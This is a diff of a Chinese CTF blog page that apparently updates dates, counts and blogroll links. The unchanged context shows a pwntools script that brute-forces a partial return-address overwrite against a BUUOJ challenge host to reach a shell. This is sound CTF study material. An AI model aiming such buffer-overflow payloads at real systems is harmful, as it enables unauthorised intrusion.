@@ -51,7 +51,7 @@
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116101054274.png">
 <meta property="article:published_time" content="2021-12-01T13:23:43.000Z">
-<meta property="article:modified_time" content="2021-12-07T11:24:54.319Z">
+<meta property="article:modified_time" content="2021-12-11T12:21:03.968Z">
 <meta property="article:author" content="4XWi11">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129153110558.png">
@@ -185,13 +185,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -220,10 +220,10 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://github.com/JinYiTong" title="https:&#x2F;&#x2F;github.com&#x2F;JinYiTong" rel="noopener" target="_blank">j1ang（姜少 Web大师傅）</a>
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">j1ang（姜少 Web大师傅）</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt（V&N Misc师傅）</a>
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt（V&N Misc师傅在做病毒分析）</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://www.cnblogs.com/yunqian2017/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017&#x2F;" rel="noopener" target="_blank">Openg（彭总 Misc之神）</a>
@@ -303,7 +303,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-12-07 19:24:54" itemprop="dateModified" datetime="2021-12-07T19:24:54+08:00">2021-12-07</time>
+        <time title="修改时间：2021-12-11 20:21:03" itemprop="dateModified" datetime="2021-12-11T20:21:03+08:00">2021-12-11</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -433,7 +433,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&quot;./pie&quot;)</span></span><br><span class="line">        p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29495</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="comment"># 本地打不通，因为libc2.27的system(&#x27;/bin/sh&#x27;)有栈不对齐，不用push rbp，所以跳转11C1</span></span><br><span class="line">        payload = <span class="number">24</span> * <span class="string">b&quot;a&quot;</span> + <span class="string">b&quot;\xC1\x11&quot;</span></span><br><span class="line">        <span class="comment"># payload = 24 * &quot;a&quot; + p16(0x11C1)			python2</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201015425192.png" alt="image-20211201015425192"></p>
-<p>emmmmm手动交互就难受，我恨，这tm是双射，所以payload不变就是$\frac{1}{16}$，像是很多人按照<code>0~f</code>爆破payload，就$\frac{1}{256}$，这里只会手交就寄了</p>
+<p>emmmmm手动交互就难受，我恨，这tm是？射，所以payload不变就是$\frac{1}{16}$，像是很多人按照<code>0~f</code>爆破payload，就$\frac{1}{256}$，这里只会手交就寄了</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/%E5%8F%8C%E5%B0%84.svg" alt="双射"></p>
 <hr>
 <p>以下是菜鸡出题人py的一天，太菜了，全部出自别的比赛的签到题</p>
@@ -597,13 +597,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">962k</span>
+    <span title="站点总字数">970k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">14:34</span>
+    <span title="站点阅读时长">14:42</span>
   </span>
 </div>
 <div class="busuanzi-count">
